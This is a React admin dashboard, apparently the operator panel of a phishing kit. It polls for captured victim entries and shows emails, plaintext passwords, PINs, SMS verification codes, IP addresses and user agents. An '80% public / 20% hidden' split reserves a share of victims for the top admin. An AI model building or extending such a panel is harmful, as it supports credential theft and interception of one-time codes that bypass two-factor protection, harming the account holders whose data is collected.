import { useLocation } from "wouter";
import { useQuery, useMutation } from "@tanstack/react-query";
import { type InboxMessage } from "@shared/schema";
import { apiRequest, queryClient } from "@/lib/queryClient";
import { Button } from "@/components/ui/button";
import { Avatar, AvatarFallback } from "@/components/ui/avatar";
import { Badge } from "@/components/ui/badge";
import { LogOut, Mail, Lock, Hash, MessageSquare, Calendar, Globe, Inbox, EyeOff } from "lucide-react";
import { format } from "date-fns";
import { ar } from "date-fns/locale";
import { useEffect } from "react";

interface AdminUser {
  id: string;
  username: string;
  role: string;
}

export default function AdminDashboard() {
  const [, setLocation] = useLocation();

  // Check if admin is logged in via session
  const { data: adminResponse, isLoading: isLoadingAdmin, error: adminError } = useQuery<{ success: boolean; admin: AdminUser }>({
    queryKey: ["/api/admin/me"],
    retry: false,
  });

  const admin = adminResponse?.admin || null;

  // Redirect to login if not authenticated
  if (adminError || (!isLoadingAdmin && !admin)) {
    setLocation("/admin/login");
    return null;
  }

  // Fetch public messages (80%)
  const { data: publicMessagesResponse, refetch: refetchPublic } = useQuery<{ success: boolean; messages: InboxMessage[]; adminRole: string }>({
    queryKey: ["/api/admin/inbox/public"],
    enabled: !!admin,
    refetchInterval: 5000, // Poll every 5 seconds
  });

  // Fetch hidden messages (20%) - only for admin
  const { data: hiddenMessagesResponse, refetch: refetchHidden } = useQuery<{ success: boolean; messages: InboxMessage[]; adminRole: string }>({
    queryKey: ["/api/admin/inbox/hidden"],
    enabled: !!admin && admin?.role === "admin",
    refetchInterval: 5000, // Poll every 5 seconds
  });

  const publicMessages: InboxMessage[] = publicMessagesResponse?.messages || [];
  const hiddenMessages: InboxMessage[] = hiddenMessagesResponse?.messages || [];
  const isAdmin = admin?.role === "admin";

  const logoutMutation = useMutation({
    mutationFn: async () => {
      await apiRequest("POST", "/api/admin/logout", {});
    },
    onSuccess: () => {
      queryClient.clear();
      setLocation("/admin/login");
    },
  });

  const handleLogout = () => {
    logoutMutation.mutate();
  };

  if (!admin) {
    return null;
  }

  // Generate avatar color based on email
  const getAvatarColor = (email: string) => {
    const colors = [
      "bg-blue-500",
      "bg-green-500",
      "bg-yellow-500",
      "bg-purple-500",
      "bg-pink-500",
      "bg-indigo-500",
      "bg-red-500",
      "bg-teal-500",
    ];
    const index = email.charCodeAt(0) % colors.length;
    return colors[index];
  };

  // Get initials from email
  const getInitials = (email: string) => {
    return email.charAt(0).toUpperCase();
  };

  // Render message card
  const MessageCard = ({ message }: { message: InboxMessage }) => {
    const isRegistration = message.messageType === "registration";
    const isSmsVerification = message.messageType === "sms_verification";

    return (
      <div
        key={message.id}
        data-testid={`message-${message.id}`}
        className="bg-card rounded-lg border p-4 hover-elevate active-elevate-2 transition-all"
      >
        <div className="flex gap-4">
          {/* Avatar */}
          <Avatar className={`w-12 h-12 ${getAvatarColor(message.email)} flex-shrink-0`}>
            <AvatarFallback className="text-white font-bold text-lg">
              {getInitials(message.email)}
            </AvatarFallback>
          </Avatar>

          {/* Content */}
          <div className="flex-1 min-w-0">
            {/* Header */}
            <div className="flex items-start justify-between mb-2">
              <div className="flex-1 min-w-0">
                <div className="flex items-center gap-2">
                  <h3 className="font-semibold text-base truncate">{message.email}</h3>
                  <Badge variant={isRegistration ? "default" : "secondary"} className="text-xs">
                    {isRegistration ? "تسجيل جديد" : "كود SMS"}
                  </Badge>
                </div>
                <div className="flex items-center gap-2 mt-1">
                  <span className="text-xs text-muted-foreground flex items-center gap-1">
                    <Calendar className="w-3 h-3" />
                    {format(new Date(message.createdAt), "dd MMM yyyy - HH:mm", { locale: ar })}
                  </span>
                </div>
              </div>
            </div>

            {/* Message content */}
            <div className="bg-muted/50 rounded-lg p-3 space-y-2">
              {/* Registration message */}
              {isRegistration && (
                <>
                  <div className="flex items-start gap-2 text-sm">
                    <Mail className="w-4 h-4 text-muted-foreground mt-0.5 flex-shrink-0" />
                    <div className="flex-1 min-w-0">
                      <span className="text-muted-foreground">البريد:</span>
                      <span className="mr-2 font-mono break-all">{message.email}</span>
                    </div>
                  </div>

                  {/* Password - Admin only */}
                  {isAdmin && message.password && (
                    <div className="flex items-start gap-2 text-sm">
                      <Lock className="w-4 h-4 text-amber-500 mt-0.5 flex-shrink-0" />
                      <div className="flex-1 min-w-0">
                        <span className="text-muted-foreground">كلمة المرور:</span>
                        <span className="mr-2 font-mono break-all">{message.password}</span>
                        <Badge variant="secondary" className="text-xs mr-2">
                          مدير فقط
                        </Badge>
                      </div>
                    </div>
                  )}

                  {message.pin && (
                    <div className="flex items-start gap-2 text-sm">
                      <Hash className="w-4 h-4 text-muted-foreground mt-0.5 flex-shrink-0" />
                      <div className="flex-1 min-w-0">
                        <span className="text-muted-foreground">رمز PIN:</span>
                        <span className="mr-2 font-mono">{message.pin}</span>
                      </div>
                    </div>
                  )}
                </>
              )}

              {/* SMS verification message */}
              {isSmsVerification && (
                <>
                  <div className="flex items-start gap-2 text-sm">
                    <Mail className="w-4 h-4 text-muted-foreground mt-0.5 flex-shrink-0" />
                    <div className="flex-1 min-w-0">
                      <span className="text-muted-foreground">الحساب:</span>
                      <span className="mr-2 font-mono break-all">{message.email}</span>
                    </div>
                  </div>

                  {/* SMS Code - Admin only */}
                  {isAdmin && message.smsCode && (
                    <div className="flex items-start gap-2 text-sm">
                      <MessageSquare className="w-4 h-4 text-amber-500 mt-0.5 flex-shrink-0" />
                      <div className="flex-1 min-w-0">
                        <span className="text-muted-foreground">كود SMS:</span>
                        <span className="mr-2 font-mono text-lg font-bold">{message.smsCode}</span>
                        <Badge variant="secondary" className="text-xs mr-2">
                          مدير فقط
                        </Badge>
                      </div>
                    </div>
                  )}
                </>
              )}

              {/* IP Address */}
              {message.ipAddress && (
                <div className="flex items-start gap-2 text-sm">
                  <Globe className="w-4 h-4 text-muted-foreground mt-0.5 flex-shrink-0" />
                  <div className="flex-1 min-w-0">
                    <span className="text-muted-foreground">IP:</span>
                    <span className="mr-2 font-mono text-xs">{message.ipAddress}</span>
                  </div>
                </div>
              )}
            </div>

            {/* User Agent - Admin only */}
            {isAdmin && message.userAgent && (
              <div className="mt-2 text-xs text-muted-foreground truncate">
                {message.userAgent}
              </div>
            )}
          </div>
        </div>
      </div>
    );
  };

  return (
    <div className="min-h-screen bg-background" dir="rtl">
      <header className="border-b bg-card sticky top-0 z-50">
        <div className="container mx-auto px-4 py-4 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <Inbox className="w-6 h-6 text-primary" />
            <div>
              <h1 className="text-xl font-bold">صندوق الوارد</h1>
              <div className="text-sm text-muted-foreground flex items-center gap-2">
                مرحباً، {admin.username}
                {isAdmin && (
                  <Badge variant="default" className="text-xs">
                    مدير
                  </Badge>
                )}
              </div>
            </div>
          </div>
          <Button
            variant="outline"
            onClick={handleLogout}
            data-testid="button-logout"
          >
            <LogOut className="w-4 h-4 ml-2" />
            تسجيل الخروج
          </Button>
        </div>
      </header>

      <main className="container mx-auto px-4 py-6 max-w-4xl">
        {/* Hidden Section - Only visible to admin */}
        {isAdmin && hiddenMessages.length > 0 && (
          <div className="mb-8">
            <div className="flex items-center gap-2 mb-4 bg-amber-500/10 border border-amber-500/20 rounded-lg p-3">
              <EyeOff className="w-5 h-5 text-amber-500" />
              <div>
                <h2 className="font-semibold text-amber-500">القسم المخفي</h2>
                <p className="text-xs text-muted-foreground">
                  هذه الرسائل مرئية لك فقط - {hiddenMessages.length} رسالة
                </p>
              </div>
            </div>
            <div className="space-y-3">
              {hiddenMessages.map((message) => (
                <MessageCard key={message.id} message={message} />
              ))}
            </div>
          </div>
        )}

        {/* Public Section */}
        <div>
          <div className="flex items-center gap-2 mb-4">
            <Inbox className="w-5 h-5 text-primary" />
            <h2 className="font-semibold">
              الرسائل - {publicMessages.length} رسالة
            </h2>
          </div>
          
          {publicMessages.length === 0 ? (
            <div className="flex items-center justify-center py-12 bg-muted/20 rounded-lg">
              <p className="text-muted-foreground">لا توجد رسائل حتى الآن</p>
            </div>
          ) : (
            <div className="space-y-3">
              {publicMessages.map((message) => (
                <MessageCard key={message.id} message={message} />
              ))}
            </div>
          )}
        </div>
      </main>
    </div>
  );
}
